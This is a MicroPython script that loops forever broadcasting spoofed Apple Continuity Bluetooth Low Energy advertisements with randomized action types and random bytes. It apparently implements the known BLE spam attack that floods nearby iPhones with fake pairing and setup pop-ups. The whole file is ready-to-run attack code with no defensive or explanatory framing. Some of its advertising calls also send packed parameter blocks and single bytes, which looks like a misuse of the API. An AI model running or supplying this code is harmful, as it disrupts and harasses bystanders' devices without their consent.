import random
import utime
import ubluetooth as bluetooth
import struct

def main():
    bt = bluetooth.BLE()
    bt.active(True)

    try:
        while True:
            types = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
            bt_packet = bytes([16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, types[random.randint(0, len(types) - 1)],
                              random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 0x00, 0x00, 0x10,
                              random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)])
            struct_params = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
            cmd_pkt = struct.pack("<HHBBB6BBB", *struct_params)
            
            # Send commands over BLE
            bt.gap_advertise(100, bytearray(cmd_pkt))
            utime.sleep(0.02)
            bt.gap_advertise(100, bytearray([0x01]))
            utime.sleep(0.02)
            bt.gap_advertise(100, bt_packet)
            utime.sleep(0.02)
            
            utime.sleep(0.02)
            bt.gap_advertise(100, bytearray([0x00]))
            utime.sleep(0.02)

    except KeyboardInterrupt:
        print("Keyboard interrupt, closing connection.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
